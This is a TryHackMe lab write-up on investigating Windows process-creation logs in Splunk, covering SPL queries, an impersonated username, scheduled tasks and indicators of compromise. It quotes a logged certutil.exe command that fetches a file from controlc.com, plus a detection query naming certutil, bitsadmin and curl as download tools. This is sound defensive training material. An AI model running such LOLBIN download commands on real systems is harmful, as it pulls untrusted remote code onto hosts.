# TryHackMe – Benign | Windows Event Log Investigation with Splunk

**Platform:** TryHackMe  
**Room:** [Benign](https://tryhackme.com/room/benign)  
**Tools:** Splunk SIEM, Windows Security Event Logs  
**Focus:** Threat Detection, Log Analysis, LOLBIN Investigation, Incident Triage

## Overview

I completed the TryHackMe **Benign** challenge, investigating suspicious process execution within a Windows environment using Splunk.

The scenario involved a potentially compromised HR workstation, suspicious scheduled tasks, an impersonated user account, and the use of a legitimate Windows binary to retrieve content from an external host.

The investigation was based on **Windows Event ID 4688 (Process Creation)** ingested into Splunk.

## Investigation & SPL Queries

### 1. Initial Log Analysis

I started by exploring the available logs and identifying the user accounts involved.

```spl
index=win_eventlogs
| stats count by UserName
| sort count
```

Comparing the results with the legitimate employee list helped identify an unusual account: `Amel1a`, using the number `1` instead of the letter `i`.

**Finding:** Potential username impersonation.

### 2. Suspicious Scheduled Tasks

I investigated executions of the Windows scheduled-task utility.

```spl
index=win_eventlogs "schtasks"
| stats count by UserName
```

The investigation identified `Chris.fort` as an HR-associated user executing scheduled-task commands.

**Finding:** Scheduled-task activity requiring investigation of the command-line arguments and execution context.

### 3. LOLBIN Investigation

I searched for legitimate Windows executables commonly abused to retrieve remote files.

```spl
index=win_eventlogs (certutil.exe OR bitsadmin.exe OR curl.exe)
| stats count by UserName
```

Further examination of process execution events identified the following activity:

```text
Event ID: 4688
UserName: haroon
HostName: HR_01
ProcessName: C:\Windows\System32\certutil.exe
CommandLine: certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

This command indicates an attempt to retrieve remote content using `certutil.exe`, a trusted Windows utility.

**Finding:** Suspicious LOLBIN execution on an HR workstation.

### 4. IOC Identification

The investigation identified these indicators:

| Indicator | Value |
|---|---|
| Suspicious host | HR_01 |
| Associated user | haroon |
| LOLBIN | certutil.exe |
| Remote domain | controlc.com |
| Referenced output file | benign.exe |
| Process execution date | 2022-03-04 |
| Event ID | 4688 |

The external resource was also associated with a TryHackMe challenge marker in its content.

### 5. Evidence Assessment

Windows Event ID 4688 provides evidence that a process was created, together with its command line when available.

However, it does not independently confirm that a remote download succeeded or that the retrieved file was executed.

Additional evidence, such as Sysmon file creation events, network telemetry, and EDR process activity, would help establish the full execution chain.

## Key Takeaways

- Improved my ability to write SPL queries for Windows log investigations.
- Learned to identify suspicious usernames by comparing them with known legitimate accounts.
- Investigated scheduled-task activity and potential LOLBIN abuse.
- Practised extracting indicators of compromise from process command lines.
- Reinforced the importance of distinguishing observed activity from confirmed compromise.

## Conclusion

This room helped me develop a more structured approach to SOC investigations: starting with a suspicious alert, narrowing down relevant events, identifying unusual process execution, and documenting the available evidence.

One of my main learning points was understanding that a successful Splunk search is only the beginning of an investigation. The context and interpretation of the results are equally important.

---

**Lab:** [TryHackMe – Benign](https://tryhackme.com/room/benign)  
**Portfolio:** [SOC Analyst Labs](https://github.com/Mirciuz/SOC-Analyst-Labs)
